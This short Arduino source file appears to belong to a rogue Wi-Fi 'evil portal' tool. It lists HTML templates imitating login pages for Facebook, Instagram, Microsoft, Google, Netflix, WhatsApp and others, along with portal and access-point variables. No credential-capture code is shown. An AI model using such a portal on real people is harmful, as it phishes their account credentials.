#include "config.h"
#include <Arduino.h>

const char* TEMPLATES[TEMPLATE_COUNT] = {
    "facebook.html",
    "instagram.html",
    "microsoft.html",
    "x.html",
    "google.html",
    "wifi_login.html",
    "netflix.html",
    "whatsapp.html"
};

const char* TEMPLATE_NAMES[TEMPLATE_COUNT] = {
    "Facebook",
    "Instagram",
    "Microsoft",
    "X (Twitter)",
    "Google",
    "WiFi Login",
    "Netflix",
    "WhatsApp"
};

bool portalActive = false;
int currentTemplate = 0;
String currentSSID = AP_SSID;
